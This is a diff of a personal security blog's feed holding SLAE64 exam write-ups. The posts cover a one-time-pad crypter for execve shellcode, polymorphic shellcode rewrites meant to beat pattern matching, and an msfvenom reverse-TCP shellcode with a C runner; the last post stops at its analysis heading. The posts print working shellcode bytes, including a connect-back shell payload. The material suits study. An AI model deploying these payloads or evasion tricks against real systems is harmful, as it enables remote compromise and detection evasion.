@@ -1,17 +1,573 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-03-12T16:32:07+02:00</updated><id>http://localhost:4000/</id><title type="html">Silvia’s blog</title><subtitle>Random notes or stuff I am curious about.
-</subtitle><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><entry><title type="html">Writing a 64-bit custom encoder</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE4/" rel="alternate" type="text/html" title="Writing a 64-bit custom encoder" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE4</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE4/">&lt;p&gt;This blog post covers the 4/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; where we are going to create our own custom encoding scheme in order to use it with an execve-stack as shellcode. As a second step I am presenting a decoder routine for the custom encoding sceme which decodes the shellcode in memory when ran.&lt;br /&gt;
-&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-06-09T23:08:56+03:00</updated><id>http://localhost:4000/</id><title type="html">Silvia’s blog</title><subtitle>Random notes or stuff I am curious about.
+</subtitle><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><entry><title type="html">Custom encrypter - One-time pad (OTP)</title><link href="http://localhost:4000/blog/2019-05-02-blog-SLAE7/" rel="alternate" type="text/html" title="Custom encrypter - One-time pad (OTP)" /><published>2019-05-02T00:00:00+03:00</published><updated>2019-05-02T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE7</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-02-blog-SLAE7/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 7/7 assignment is to create a custom crypter using any existing encryption schema. It can be written in any programming language of one’s choice.&lt;/p&gt;
 
-&lt;p&gt;&lt;b&gt;Task:&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;h3 id=&quot;custom-encrypter---one-time-pad&quot;&gt;Custom encrypter - one time pad&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;The encryption routine I chose for this assignment is the &lt;strong&gt;One-time pad (OTP)&lt;/strong&gt;, which for it to work, needs a pre-shared key. The need for a pre-shared key in order to decrypt the payload is unfortunately one of the problems coming up when talking about the OTP. If the key sharing is not done securely, there is no point of using one-time pads in the first place. As this write-up won’t touch the topic of key sharing one bit, I assume one should come up with idea to share it securely outside the bounds of this little article.&lt;/p&gt;
+
+&lt;p&gt;The simple idea behind using a one-time pad can be described with a small example. If we have plain text &lt;strong&gt;a&lt;/strong&gt;, and we have securely pre-shared a secret key &lt;strong&gt;b&lt;/strong&gt;, then to have an encrypted text we would xor &lt;strong&gt;a&lt;/strong&gt; and &lt;strong&gt;b&lt;/strong&gt;. In order to decrypt the message we would use the pre-shared key &lt;strong&gt;b&lt;/strong&gt; again to xor it with the encrypted text instead. In such a way we would end up again with the original text &lt;strong&gt;a&lt;/strong&gt;. The following scheme describes the exact same steps taken:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/encrypter.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;random-key-generation&quot;&gt;Random key generation&lt;/h4&gt;
+
+&lt;p&gt;How do you create a key that is truely random? This is another problem aside from sharing the key itself. This is the moment, where if you would start looking around in the Internet, you would stumble upon pseudo-random number generators and true random number generators. Since I made up my mind that I would be using Python for this assignment, I decided to look what this language has to offer me out of the box and ended up using the &lt;code class=&quot;highlighter-rouge&quot;&gt;urandom()&lt;/code&gt; function from the &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; module. I made this choice following Python’s own suggestions at generating pseudo-random numbers &lt;a href=&quot;https://docs.python.org/2/library/random.html&quot;&gt;1&lt;/a&gt; page where they state:&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;“Warning The pseudo-random generators of this module should not be used for security purposes. Use os.urandom() or SystemRandom if you require a cryptographically secure pseudo-random number generator.”&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Another thing with one-time pad is that the key can be the same length as the payload or longer. I decided to keep it the same length with the payload itself.&lt;/p&gt;
+
+&lt;h4 id=&quot;encryption&quot;&gt;Encryption&lt;/h4&gt;
+
+&lt;p&gt;So finally the encryption routine ended up pretty short and simple, but as I decided to use Python 3 instead of 2 (nice experience for the future), it took me a little while. As os.urandom creates a random string of specified length and key[i] would give its decimal representation I could directly use it in xor. On the otherhand plaintext[i] would still need the ord() function applied in order to return an integer instead of an ascii char. The result of the xor operation still needed some formating as results like &lt;code class=&quot;highlighter-rouge&quot;&gt;0b&lt;/code&gt; would by default be displayed just &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; in the final encrypted string. The formating here was important as I wanted to have the encrypted payload exactly the same length as the original payload. In this case, 43 bytes.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os, codecs
+
+def encrypt(plaintext, key):
+	print (&quot;[+] -------- Encryption --------&quot;)
+	print (&quot;[+] Key: &quot;+str(codecs.encode(key, 'hex')))
+	encrypted = &quot;&quot;
+
+	for i in range(len(plaintext)):
+		c = ord(plaintext[i]) ^ key[i]
+		d = &quot;{:02x}&quot;.format(c)
+		#print (&quot;i:&quot;+str(i)+&quot; P: &quot;+str(plaintext[i])+&quot; K: &quot;+str(key[i])+&quot; C:&quot;+str(c)+&quot; D:&quot;+str(d))
+		encrypted += d
+
+	print (&quot;[+] Encrypted string: &quot;+encrypted)
+	return encrypted
+
+plaintext = &quot;&quot;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08
+\x48\x89\xd9\x51\x48\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48
+\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;&quot;&quot;
+key = os.urandom(len(plaintext))
+encrypted = encrypt(plaintext,key)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The final output would look as follows (python3 ./program.py encrypt payload)&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 encrypt.py
+[+] -------- Encryption --------
+[+] Key: b'81a6b9cc11b37a5ce9d32ed80bdd18393eb275088b5bff05befe12ccff9d58613b597a5e5d002401d0ee73'
+[+] Encrypted string: c9976b84aa9c553e80bd01ab6395d9d236fafcd1da1376e2ecb69120f7d5d15d1f11f3b81531e4b1ebe176
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;decryption&quot;&gt;Decryption&lt;/h4&gt;
+
+&lt;p&gt;For the decryption I needed my code to perform the same xor operation again, but on the encrypted payload with the shared key.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import codecs
+
+def decrypt(encrypted, key):
+	print (&quot;[+] -------- Decryption --------&quot;)
+	decrypted = &quot;&quot;
+	msg = codecs.decode(encrypted, 'hex')
+
+	for i in range(len(msg)):
+		c =  msg[i] ^ key[i]
+		d = &quot;{:02x}&quot;.format(c)
+		decrypted += d
+
+	print (&quot;[+] Decrypted string (XX): \n&quot;+decrypted)
+	print(&quot;[+] Decrypted string (\\xXX):\n&quot; + r&quot;\x&quot; + r&quot;\x&quot;.join(decrypted[n : n+2] for n in range(0, len(decrypted), 2)))
+
+encrypted = &quot;ad15b360f30576bb4a0a75476da68ad1d287c22c078ad2b71929cb3de177e13fdea4a0ff4441e94195222e&quot;
+key = &quot;e5246128482a59d923645a3405ee4b3adacf4bf556c25b504b6148d1e93f6803faec29190c7029f1ae2d2b&quot;
+
+decrypt(encrypted, codecs.decode(key, 'hex'))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The final output would look as follows, so we end up with our initial plaintext payload:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 decrypt.py
+[+] -------- Decryption --------
+[+] Decrypted string (XX):
+4831d248bb2f2f62696e2f736848c1eb084889d9514889e7524883ec0848893c244889e64831c0b03b0f05
+[+] Decrypted string (\xXX):
+\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x89\xd9\x51\x48
+\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Link to source code in Github: &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task7/encrypter.py&quot;&gt;encrypter&lt;/a&gt; and &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task7/decrypter.py&quot;&gt;decrypter&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Create a custom encoding scheme like the “Insertion Encoder” we showed you&lt;/li&gt;
-  &lt;li&gt;P0C with using execve-stack as the shellcode to encode with your schema and execute&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 7/7 assignment is to create a custom crypter using any existing encryption schema. It can be written in any programming language of one’s choice.</summary></entry><entry><title type="html">Polymorphic shellcodes for samples taken from Shell-Storm</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE6/" rel="alternate" type="text/html" title="Polymorphic shellcodes for samples taken from Shell-Storm" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE6</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE6/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 6/7 assignment is to take up to 3 shellcodes from shell-storm and create polymorphic versions of those samples to beat pattern matching. The requirement is that the polymorphic versions cannot be larger than the 150% of the existing shellcode.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;h3 id=&quot;shellcode-1---execve&quot;&gt;Shellcode 1 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;The &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-603.php&quot;&gt;first shellcode&lt;/a&gt; I chose from the Shell-Storm website was a generic 64-bit &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; shellcode which is 30 bytes long. So, I created a polymorphic version with the length of 43 bytes (less than 150% of the original shellcode). On the picture below I have shown which exact instructions got replaced with something else and then continue to explain each desicion one step at a time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - Instead of the &lt;code class=&quot;highlighter-rouge&quot;&gt;push rax&lt;/code&gt; marked in yellow, I decided to &lt;code class=&quot;highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; first and use that instead, as I would be needing to set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; zero anyway to prepare it for the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - I also decided to replace the &lt;code class=&quot;highlighter-rouge&quot;&gt;push rbx&lt;/code&gt; (in green) from the original shellcode in a manner where I could get the same result but via another register. For that I simply chose to move the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt; to another register which I then push’ed instead.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - To prepare the 2nd argument &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; for the syscall, I took another way of first allocating space for it right after I had pushed 8 zero-bytes to the stack. Then moved the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to an address appointed to by the stack pointer (so right to the spot which I just allocated) and moved that address to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - since I did not clean the &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; register somewhere earlier, I made sure it was zeroed out before loading the syscall number to it and executed the syscall.&lt;/p&gt;
+
+&lt;h3 id=&quot;shellcode-2---execveat&quot;&gt;Shellcode 2 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;Going through shellcodes at Shell-Storm, I came by a &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-905.php&quot;&gt;shellcode&lt;/a&gt; which used the &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt; syscall. I had never tried it myself before so seemed an interesting way to go with that one. I ended up with a 31 byte long polymorphic version of that shellcode, so only 2 bytes longer than the original one.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - the author of the original shellcode wanted to prepare the syscall number 0x142 for &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt; as the very first thing. Without loading the value directly to its intended register &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, he loaded a value 0x42 and then incremented the &lt;code class=&quot;highlighter-rouge&quot;&gt;ah&lt;/code&gt; by 1 ending up with the value 0x142. I decided to go the other way around and substract 1 from 0x143 instead, ending up with the same result.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;cqo&lt;/code&gt; is an intresting instruction, which doubles the size of the operand in register &lt;code class=&quot;highlighter-rouge&quot;&gt;ax/eax/rax&lt;/code&gt; and stores the result as &lt;code class=&quot;highlighter-rouge&quot;&gt;dx:ax/edx:eax/rdx:rax&lt;/code&gt;. so basically what happens here is that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; register will simply be zerod out, because of sign-extending. We can get the same result by xor’ing &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; with itself.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - the instructions marked in blue, where the program name “/bin/sh” is placed eventually to the top of the stack with &lt;code class=&quot;highlighter-rouge&quot;&gt;push reg&lt;/code&gt; instruction, I simply used another register (&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - I removed the lines marked in red, as there was no need for those instructions. This ended up shortening my shellcode a little bit as well.&lt;/p&gt;
+
+&lt;h3 id=&quot;shellcode-3---execve&quot;&gt;Shellcode 3 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-806.php&quot;&gt;Shellcode&lt;/a&gt; number 3 is 27 bytes in length and quite much similar to the first one, but gets the program name for &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; by negating the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt;. I decided to go with the &lt;code class=&quot;highlighter-rouge&quot;&gt;imul&lt;/code&gt; instruction instead as you can see on the image below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - I chose to substract the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; from itself, ending up with a zero.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - Next I moved the value 0xEEBE234583299 to &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt;. Multiplying it with 0x7 &lt;code class=&quot;highlighter-rouge&quot;&gt;EEBE234583299 × 7 = 68732F6E69622F&lt;/code&gt; and converting this hex value to ascii, will give us the string &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;cdq&lt;/code&gt; replacement with &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, rax&lt;/code&gt; allowed me to have the same effect of zeroing out &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; as I assured earlier that the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; would be zero.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - Finally the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rsi&lt;/code&gt; instruction. What pop essentially does is that it takes the value stored at an address pointed to by &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; and places that value into rsi. As a side-effect, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; is incremented by 8. So, by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, [rsp]&lt;/code&gt; I am going for the value stored at an address &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; and moving it to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;. Then with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rsp, 0x8&lt;/code&gt; I increment the &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; as this is what would happen automatically if I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; instruction.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;So what we learnt?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cqo&lt;/code&gt; is good to use when you try to zero out rdx by sign-extending the value in rax&lt;/li&gt;
+  &lt;li&gt;We can switch up the registers we use in our shellcode super easily&lt;/li&gt;
+  &lt;li&gt;We can use various combinations of instructions to end up with the same result value&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode1.nasm&quot;&gt;Polymorphic shellcode1.nasm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode2.nasm&quot;&gt;Polymorphic shellcode2.nasm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode3.nasm&quot;&gt;Polymorphic shellcode3.nasm&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 6/7 assignment is to take up to 3 shellcodes from shell-storm and create polymorphic versions of those samples to beat pattern matching. The requirement is that the polymorphic versions cannot be larger than the 150% of the existing shellcode.</summary></entry><entry><title type="html">Msfvenom generated shell_reverse_tcp payload</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE53/" rel="alternate" type="text/html" title="Msfvenom generated shell_reverse_tcp payload" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE53</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE53/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.3/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 3/3 shellcode analysed in this article is the shell_reverse_tcp payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;h3 id=&quot;msfvenom-generated-linuxx64shell_reverse_tcp-payload&quot;&gt;MSFvenom generated linux/x64/shell_reverse_tcp payload&lt;/h3&gt;
+
+&lt;p&gt;As a follow up to analysing &lt;a href=&quot;/blog/2019-05-01-blog-SLAE51&quot;&gt;exec shellcode&lt;/a&gt; and &lt;a href=&quot;/blog/2019-05-01-blog-SLAE52&quot;&gt;bind shellcode&lt;/a&gt;, I am going to be analysing the linux/x64/shell_reverse_tcp as final payload for task number 5. This payload is used to make the connection back to the attackers machine and spawn a command shell. In order to generate the payload I used the following command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 74 bytes
+Final size of c file: 335 bytes
+unsigned char buf[] =
+&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;
+&quot;\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10&quot;
+&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;
+&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;
+&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;
+
+&lt;p&gt;In order to analyse the generated payload I am placing it into the C program which will be executing the shellcode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;string.h&amp;gt;
+
+unsigned char code[] = \
+&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;
+&quot;\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10&quot;
+&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;
+&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;
+&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
+
+int main()
+{
+  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and finally compile the C program as follows:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;
+
